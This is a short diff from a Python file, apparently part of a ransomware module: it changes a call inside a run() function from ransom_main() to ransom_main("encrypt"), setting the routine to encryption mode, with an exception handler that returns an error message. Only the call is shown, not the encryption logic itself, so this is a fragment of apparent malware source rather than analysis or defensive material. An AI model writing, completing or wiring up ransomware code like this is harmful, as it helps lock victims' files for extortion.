@@ -28,6 +28,6 @@ def run():
 
     """
     try:
-	    ransom_main()
+	    ransom_main("encrypt")
     except Exception as e:
         return "{} error: {}".format(run.__name__, str(e))
